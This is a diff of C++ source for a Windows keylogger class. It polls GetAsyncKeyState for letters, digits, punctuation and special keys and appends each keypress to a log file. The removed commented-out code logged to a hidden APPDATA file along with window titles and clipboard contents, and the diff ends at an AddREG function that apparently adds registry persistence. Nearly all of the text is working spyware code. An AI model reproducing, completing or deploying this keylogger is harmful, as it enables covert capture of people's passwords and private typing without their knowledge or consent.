@@ -4,7 +4,6 @@
 #include <fstream>
 #include <string>
 #include <ctime>
-#include "CCLip.h"
 
 using std::cout;
 using std::fstream;
@@ -65,42 +64,9 @@ char KeyLogger::ChangeKeyToXChar(int key)
 											return 0;
 }
 
-//void KeyLogger::ReadingSpecialKeys(int key, fstream & fs)
-//{
-//	switch (key) {		//check pressed key
-//	case VK_SPACE:
-//		fs << " ";
-//		break;
-//	case VK_RETURN:
-//		fs << "-[ENTER]-";
-//		break;
-//	case VK_TAB:
-//		fs << "-[TAB]-";
-//		break;
-//	case VK_BACK:
-//		fs << "-[BS]-";
-//		break;
-//	case VK_CONTROL:
-//		fs << "-[CTRL]-";
-//		break;
-//	case VK_MENU:
-//		fs << "-[ALT]-";
-//		break;
-//	case VK_CAPITAL:
-//		fs << "-[CAPS]-";
-//		break;
-//	case VK_ESCAPE:
-//		fs << "-[ESC]-";
-//		break;
-//	default:
-//		break;
-//	}
-//}
-
 void KeyLogger::OEMkeys(fstream &fs)
-{	
-	fs.open(LogPath.c_str(), fstream::app);
-	for (oKey = VK_OEM_1; oKey <= VK_OEM_7; oKey++) { //OEM KEYS like ",.<>[}{} 
+{
+	for (oKey = VK_OEM_1; oKey <= VK_OEM_7; oKey++) { //OEM KEYS like ",.<>[}{}
 			temp = GetAsyncKeyState(oKey);
 			if (temp == -32767) {
 				switch (oKey) {		//check pressed key
@@ -208,7 +174,6 @@ void KeyLogger::OEMkeys(fstream &fs)
 				continue;
 			}
 		}
-		fs.close();
 	}
 
 string KeyLogger::GetWindowTitle()
@@ -219,30 +184,9 @@ string KeyLogger::GetWindowTitle()
 	return title;
 }
 
-//void KeyLogger::ReadingKey(fstream &fs)
-//{
-//	const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat");
-//	fs.open(LogPath.c_str(), fstream::app);
-//	time_t sysbasetime = time(0);
-//	char * date = ctime(&sysbasetime);
-//	CClip cp;
-//	string handle = GetWindowTitle(); fstream clipFile;
-//	fs << "\n \n	" << date << " \n";
-//	fs << "APP: " << handle << '\n';
-//	while (true)
-//	{
-//		if (handle != GetWindowTitle()) {
-//			Sleep(300);
-//			fs << "\n \nAPP: " << GetWindowTitle() << '\n';
-//			handle = GetWindowTitle();
-//		}
-//	}
-//}
-
 void KeyLogger::AZkeys(fstream  &fs)
 {
 	//A-Z; a-z
-	fs.open(LogPath.c_str(), fstream::app);
 	for (key = 65; key <= 90; key++) {
 
 		temp = GetAsyncKeyState(key);
@@ -253,12 +197,10 @@ void KeyLogger::AZkeys(fstream  &fs)
 			fs << char(key);
 		}
 	}
-	fs.close();
 }
 
 void KeyLogger::NUMkeys(fstream &fs)
 {
-	fs.open(LogPath.c_str(), fstream::app);
 	for (key = '0'; key <= '9'; key++) { //log numbers
 		temp = GetAsyncKeyState(key);
 		if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT)) {
@@ -268,12 +210,10 @@ void KeyLogger::NUMkeys(fstream &fs)
 			fs << ChangeKeyToXChar(key);//change key to '!', '@' etc.
 		}
 	}
-	fs.close();
 }
 
 void KeyLogger::SpecialKeys(fstream &fs)
 {
-	fs.open(LogPath.c_str(), fstream::app);
 	//Special Keys
 	for (sKey = 8; sKey <= 32; sKey++) { //Special Keys like VK_SPACE, VK_RETURN etc
 		temp = GetAsyncKeyState(sKey);
@@ -309,7 +249,6 @@ void KeyLogger::SpecialKeys(fstream &fs)
 			continue;
 		}
 	}
-	fs.close();
 }
 
 void KeyLogger::AddREG()
